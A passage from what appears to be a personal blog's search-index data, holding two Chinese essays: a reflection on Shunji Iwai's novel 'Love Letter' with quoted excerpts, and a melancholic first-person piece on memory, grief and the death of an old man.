祝福我们！\u0026ldquo;博子微笑。她想着对阿树说什么。面对着雪山，她大叫：\u0026ldquo;阿树，你好吗？我很好‥\u0026ldquo;不知什么缘故，在病榻上的阿树似听见博子，并轻轻唤道：\u0026ldquo;我很好。\u0026ldquo;\u0026ldquo;阿树！你‥好‥吗？我‥很‥好！\u0026ldquo;博子跪在雪上，控制不了。第一次，她感到自在，她可以让阿树离开了。\n6.当我在那个星期后回到学校，人们说你的阿树已经一声不响的转了校。那次就是我最后听见他的消息。\n7.阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。\n8.那本书，叫做《回忆似水年华》\n","permalink":"https://ret2neo.cn/mind/151118loveletter/","summary":"高中时代看一个样貌清秀女孩手捧《情书》在窗边读 ，阳光泻在侧脸，长发如瀑，双肩瘦削，领口的脖颈肤白胜雪，画面太美，不敢多看。然而还是一眼望尽，也立刻记住了岩井俊二这个古怪的日本名字。当时我想，这名字看似逼格颇高，有空我也得读读才成。然而好长一段时间里，再没记起那个场景，今日不知怎的，忽然忆起，打算一读《情书》，权当消磨这心乱如麻的午后。\n剧透的序最惹人厌，读罢整个故事便十分了然，他日我若为人作序，定只说破三分，留七分光景予人想往。看得见结局的开头会败了整个故事的兴味，就像一眼瞧得到头的人生并无多大活头。\n缘起在于一男一女的藤井树，他们是中学同学，因为同名同姓的缘故受同学撮合，女方无甚感觉，而作为“闷蛋”的男方却有些入戏。自然像大多年少的故事一样，这份奇特的缘分无疾而终。可他是足够幸运的，多年后遇上了和女藤井树样貌相似度颇高的博子并且几乎要步入婚姻的殿堂。然而人生诸多时候就是差那么一点点，即便耗尽所有运气也无力回天，男藤井树在婚前的一次登山中意外身亡。三年后博子又将和玻璃匠茂成婚。婚前误将女藤井树的住址当做男藤井树生前住址，与女藤井树有了几次的书信来往，一点点揭开了尘封往事。\n男藤井树是一个看历史和哲学以及《追忆似水年华》的人们眼中古怪的人和女藤井树眼中的“闷蛋”。他无意之中一点点堕入自己编织的情网，后来又悄无声息毅然决然地离开，明面上是对老师同学的“误会”的反抗，实则我料想大概是受不得日复一日的自我煎熬，企图用骄傲的离开换一个从容的背影，用潇洒的远去掩住慌乱的眼神。然而他万万没有料到的是那些闷着的日子里出现过的阳光早已给他的人生打下了不可磨灭的水印，以至于后来的人那样像是从前的替代品，这是一种不负责任的自私，却也是令人动容的真情，值得理解的荒唐。令我愉快的是故事并没有这样走向结局，我很赞同作者，再度离开才是他最好的归宿。\n女藤井树不属于他，博子同样不属于，或许，他和松田圣子比较好一些，毕竟最后的时间里，他没有想到自己的未婚妻博子，甚至也没有想到女藤井树，他只是唱着松田圣子的“我的爱随南风而逝…”，然后告别了这个世界。他的心中，只剩下求不得的苦。这让我不禁想起李宗盛的《山丘》——向情爱的挑逗，命运的左右，不自量力地还手，直至死方休。真是无比真实而残忍的写照。故事的最后，《追忆似水年华》戏剧般地被女藤井树捧在手中，阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。于男藤井树而言，也算是人生有个圆满的交代，死也值了。\n对比之下，博子的境遇就有些糟糕。毕竟无论于谁，被当做替代品都是对于已经付出的感情的莫大羞辱，也是对于多年念念不忘的真心的无情嘲讽。颇有些“越过山丘，才发现无人等候”的苦楚。然而那又如何，时过境迁，一切都不得不被原谅，怪不得谁，你有心，我也曾愿意。还好生活留给她一个瓦，因害怕失去而如履薄冰地爱着她的瓦。\n这样看来就形成了一个古怪的关系链。真情的瓦爱着对另一个男人念念不忘的博子，痴情的博子无法放下只是将对另一个女人的真心寄托在她身上的男藤井树。女藤井树时隔多年才明白当初那个男孩的炽热，而男孩已经不再，博子事过境迁才了然那个男人的炽热并不为她，而她已无可诉说。博子终将嫁给瓦，生活也终于将所有人糟蹋。\n哈哈，不能原谅却无法阻挡，谁在你心里放冷枪。\n事情常常是这样，一点也抵不过命运的作弄。然而，多年后的一封情书——“阿树，你好吗？我很好”足以无声消融一切。我们终于不再贪恋，不再妒忌，不再感伤，而是相互拥抱，渡过这冰冷的寂寞河流，杀死这刺骨的孤独时光。\n这书短的离奇，看上去停的有些不是时候。我都怀疑自己是不是找到了不全的，可是转念想想，很多事不都这样，在最以为要高潮迭起的时候戛然而止，在最应当细水长流的时候无声湮灭，也许要抱怨生活，也许生活也会无辜地摊开双手，说，你瞧，我什么也没做，都是你们在作啊。\n2015.11.18 附上摘抄: 《情书》摘抄 1.我不知道为什么他这样做，他大概是个闷蛋，无所事事。\n2.她的经历，虽然当时很不愉快，十年后看来，很有趣。\n3.\u0026ldquo;他跌下去后，我尽全力去找他。\u0026ldquo;熊山开始高歌：\u0026ldquo;我的爱随南风而逝……\u0026ldquo;\u0026ldquo;这是你们攀山者常唱的歌？\u0026ldquo;博子问。这是松田圣子的歌。\u0026ldquo;我相信当阿树敞在石下时还唱着这首歌。我听得到。\u0026ldquo;熊山说。 \u0026ldquo;也许阿树当时只是想着松田圣子。\u0026ldquo;博子耸一耸肩。博子和茂决定在熊山的家过夜。\n4.妈很愤怒。\u0026ldquo;你还记得我丈夫怎死的？他患肺炎，那是冬天，是你背他到医院的。太迟了，上次你用了45分钟。我们要等救护车。\u0026ldquo;\u0026ldquo;我只用了30分钟。\u0026ldquo;爷爷坚持：\u0026ldquo;事实上只28分钟，便到了入口。我今晚会再做得到。\u0026ldquo;当爷爷背起树时，妈挡着门口。\u0026ldquo;看，阿树是你的女儿，今晚由你决定。你选择怎做？\u0026ldquo;她知道怎么也阻不了他，所以决定让爷爷去了。风雪越下越大，爷爷背着树，踏过厚雪。他已是七十五岁了，但还很强健。半路中途，他摔倒了，面庞直倒在雪上。\u0026ldquo;你要休息一下了。\u0026ldquo;妈说。\u0026ldquo;不！我们继续！\u0026ldquo;他们花了四十分钟赶到医院，爷爷明显也要医治。医生给他一点氧气。阿树则暂时脱离危险。\n5.茂走前几步用手围着嘴巴，叫声响遍冬日早晨：\u0026ldquo;藤井树，你‥冷‥吗？你还‥唱着‥松田圣子的歌吗？我要‥跟博子‥结婚呀！好‥好‥好！\u0026ldquo;他回头看博子。\u0026ldquo;看见吗？阿树祝福我们！\u0026ldquo;博子微笑。她想着对阿树说什么。面对着雪山，她大叫：\u0026ldquo;阿树，你好吗？我很好‥\u0026ldquo;不知什么缘故，在病榻上的阿树似听见博子，并轻轻唤道：\u0026ldquo;我很好。\u0026ldquo;\u0026ldquo;阿树！你‥好‥吗？我‥很‥好！\u0026ldquo;博子跪在雪上，控制不了。第一次，她感到自在，她可以让阿树离开了。\n6.当我在那个星期后回到学校，人们说你的阿树已经一声不响的转了校。那次就是我最后听见他的消息。\n7.阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。\n8.那本书，叫做《回忆似水年华》","title":"《情书》"},{"content":"遗忘 我叫李忘，今年十八。在人们看来我是一个很糟糕的家伙，因为我总记不起昨日的承诺和明天的约定，记不起前夜的聚会和狂欢，也记不起信誓旦旦高谈阔论着的梦想与追逐。常人也会慢慢忘记很多东西，但我的遗忘功能似乎强大得多，相比之下，我更彻底地失去过去，以及那总想不起方向的未来。“无妨，不是还有现在吗？人们不是说把握现在比追忆过去和追逐未来更切实重要吗？”我常常这样安慰自己，又常常在安慰过后遗忘，继续像头猪一样在生活的泥沼中哼哼地打滚。\n我想我可能是上帝的实验品。一般人一定想不起上个月或是去年今天那个早上穿的鞋是什么颜色的，但我则想不起昨天的这个时辰女友的声嘶力竭和泛红的眼眶是为了什么，也想不起早上看励志电影时从心底深处涌起的那股渴望与为梦想奋战的决心和激情。我是麻木的。我所追忆和留恋的绝非是甜蜜的爱情和闪光的理想，而是昨天在堕入时光之渊后留下的黑暗与茫然，以及这份茫然给予的无限酸涩；我所追逐与向往的也绝非是巅峰的事业与耀眼的光荣，而是明天在可悲地变成昨天之后我无法重拾的那份朦胧，以及随之而来的哀伤和祭奠。\n我的每一个日子都是朝生暮死，我靠着生存惯性安然地活过了十八年。然而就在去年，我的惯性受到了撼动。死亡第一次接近我，我开始不得不直视它，认真地分析和评估它的力量。枯瘦如柴的老人斜斜地横在木板堆叠成的简易床铺上，上下眼皮被厚厚的眼屎相连，几乎看不见眼珠，我只是在眼角看到隐约闪烁的泪光。昏黄的灯下，孤陋的乡野，肆虐的风雨，哭嚎着的天地，老人就在这里，平静地结束了过去，也同时结束了现在和将来一切关于他的可能性。亲朋们远远地坐在厅堂里，各自神情冷漠，肃穆无言，只有我在床榻旁握着老人的手，直至最后一刻。感受着热量一点点离开这个生灵，我又想起了他惨淡而又执着的一生，他曾经苦苦追求的，难道就是这个结局，我真的不敢相信。擦干眼角，我木然地离开了房间，轻轻地说了句“走了”。一瞬间，惊愕，恐惧，茫然，释怀以及各种难以名状的情绪涌上每一个人的脸庞，但是更多的还是麻木，麻木，麻木，令我心痛而又无可奈何的麻木。然后，大家开始了早已准备停当的后续工作。而懦弱的我无法接受这一切，包括那已成俗礼的夸张的大哭。我裹着单衣，走进雨里，想陪他的灵魂最后一程。就此别了吧。从此以后，我们各自孤独，各自在各自的江湖里飘摇。只是，生者在流浪中老去，而死者，你永远年轻！\n我本以为自己能将所有的记忆像压低了声儿放屁一样悄悄搁置在我坐过的地方，然后了让它慢慢逸散开来，与天地相合，即使再尴尬地闻到也已与我无关，甚至可以捏着鼻子，摆出一副嫌恶的表情，自然地努努嘴叹一声“哎呀，真臭啊。”可是，那一幕始终在我的脑海里。一年多来，不管是学业还是人类引以为精神支柱的爱情，关于它们的一切我都可以迅速地遗忘。我在寻找着它们，它们也在寻找着我，只是我很清楚，我瞧不起它们，它们也瞧不起我。可是死亡不一样，我不找它，但它在找我，每天每时每刻进度条都在前进着，而且，必有那么一天，它会像水蛇一样柔柔地缠上我。然后在大脑一片空白时我陷入了永远的沉睡，不再醒来。那是比爱情更加销魂的毁灭，比成功更加诱人的沉沦。我想，有些时候，我真忍不住要歌颂你。\n我终于清楚明白地了解了，那人们追忆着的昨日，和追逐的明天都不过是镜花水月，而我所追求的此刻的宁静和下一刻的彻底遗忘，才是生命最终的归宿，也是整个文明的最高依托。因为一切，都会涅没在黎明前最黑的黑暗里。对于破晓，我们那么接近，那么相信，但是不可能，不可能看到曙光。\n我犹记得那个流浪在风雨里，为逝去的灵魂品尝泪水的夜里，我所看到的竹林。我想那摇曳的竹影和沙沙的哭声，便是所有生命最真实的写照和所有问题最终的答案。\n谨此记2014年8月殁事。时2015年。\n","permalink":"https://ret2neo.cn/mind/141123whyforget/","summary":"遗忘 我叫李忘，今年十八。在人们看来我是一个很糟糕的家伙，因为我总记不起昨日的承诺和明天的约定，记不起前夜的聚会和狂欢，也记不起信誓旦旦高谈阔论着的梦想与追逐。常人也会慢慢忘记很多东西，但我的遗忘功能似乎强大得多，相比之下，我更彻底地失去过去，以及那总想不起方向的未来。“无妨，不是还有现在吗？人们不是说把握现在比追忆过去和追逐未来更切实重要吗？”我常常这样安慰自己，又常常在安慰过后遗忘，继续像头猪一样在生活的泥沼中哼哼地打滚。\n我想我可能是上帝的实验品。一般人一定想不起上个月或是去年今天那个早上穿的鞋是什么颜色的，但我则想不起昨天的这个时辰女友的声嘶力竭和泛红的眼眶是为了什么，也想不起早上看励志电影时从心底深处涌起的那股渴望与为梦想奋战的决心和激情。我是麻木的。我所追忆和留恋的绝非是甜蜜的爱情和闪光的理想，而是昨天在堕入时光之渊后留下的黑暗与茫然，以及这份茫然给予的无限酸涩；我所追逐与向往的也绝非是巅峰的事业与耀眼的光荣，而是明天在可悲地变成昨天之后我无法重拾的那份朦胧，以及随之而来的哀伤和祭奠。\n我的每一个日子都是朝生暮死，我靠着生存惯性安然地活过了十八年。然而就在去年，我的惯性受到了撼动。死亡第一次接近我，我开始不得不直视它，认真地分析和评估它的力量。枯瘦如柴的老人斜斜地横在木板堆叠成的简易床铺上，上下眼皮被厚厚的眼屎相连，几乎看不见眼珠，我只是在眼角看到隐约闪烁的泪光。昏黄的灯下，孤陋的乡野，肆虐的风雨，哭嚎着的天地，老人就在这里，平静地结束了过去，也同时结束了现在和将来一切关于他的可能性。亲朋们远远地坐在厅堂里，各自神情冷漠，肃穆无言，只有我在床榻旁握着老人的手，直至最后一刻。感受着热量一点点离开这个生灵，我又想起了他惨淡而又执着的一生，他曾经苦苦追求的，难道就是这个结局，我真的不敢相信。擦干眼角，我木然地离开了房间，轻轻地说了句“走了”。一瞬间，惊愕，恐惧，茫然，释怀以及各种难以名状的情绪涌上每一个人的脸庞，但是更多的还是麻木，麻木，麻木，令我心痛而又无可奈何的麻木。然后，大家开始了早已准备停当的后续工作。而懦弱的我无法接受这一切，包括那已成俗礼的夸张的大哭。我裹着单衣，走进雨里，想陪他的灵魂最后一程。就此别了吧。从此以后，我们各自孤独，各自在各自的江湖里飘摇。只是，生者在流浪中老去，而死者，你永远年轻！\n我本以为自己能将所有的记忆像压低了声儿放屁一样悄悄搁置在我坐过的地方，然后了让它慢慢逸散开来，与天地相合，即使再尴尬地闻到也已与我无关，甚至可以捏着鼻子，摆出一副嫌恶的表情，自然地努努嘴叹一声“哎呀，真臭啊。”可是，那一幕始终在我的脑海里。一年多来，不管是学业还是人类引以为精神支柱的爱情，关于它们的一切我都可以迅速地遗忘。我在寻找着它们，它们也在寻找着我，只是我很清楚，我瞧不起它们，它们也瞧不起我。可是死亡不一样，我不找它，但它在找我，每天每时每刻进度条都在前进着，而且，必有那么一天，它会像水蛇一样柔柔地缠上我。然后在大脑一片空白时我陷入了永远的沉睡，不再醒来。那是比爱情更加销魂的毁灭，比成功更加诱人的沉沦。我想，有些时候，我真忍不住要歌颂你。\n我终于清楚明白地了解了，那人们追忆着的昨日，和追逐的明天都不过是镜花水月，而我所追求的此刻的宁静和下一刻的彻底遗忘，才是生命最终的归宿，也是整个文明的最高依托。因为一切，都会涅没在黎明前最黑的黑暗里。对于破晓，我们那么接近，那么相信，但是不可能，不可能看到曙光。\n我犹记得那个流浪在风雨里，为逝去的灵魂品尝泪水的夜里，我所看到的竹林。我想那摇曳的竹影和沙沙的哭声，便是所有生命最真实的写照和所有问题最终的答案。\n谨此记2014年8月殁事。时2015年。","title":"遗忘"}]